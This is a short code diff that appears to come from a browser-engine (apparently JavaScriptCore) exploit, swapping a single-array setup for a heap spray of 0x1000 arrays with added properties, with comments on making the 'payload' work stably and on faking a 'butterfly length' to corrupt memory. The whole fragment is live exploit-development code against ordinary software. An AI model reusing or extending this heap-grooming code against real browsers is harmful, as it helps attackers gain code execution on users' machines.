@@ -537,20 +537,20 @@ var VM_PROT_EXECUTE = 0x4
     // var victim = structs[0];
     //
     // and the payload still work stablely. It seems this action is redundant
-    /*var structs = []
+    var structs = []
     for (var i = 0; i < 0x1000; ++i) {
         var array = [13.37];
         array.pointer = 1234;
         array['prop' + i] = 13.37;
         structs.push(array);
-    }*/
-              var structs = [];
+    }
+              /*var structs = [];
               var i = 0;
               var abc = [13.37];
               abc.pointer = 1234;
               abc['prop' + i] = 13.37;
               structs.push(abc);
-              var victim = structs[0];
+              var victim = structs[0];*/
 
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
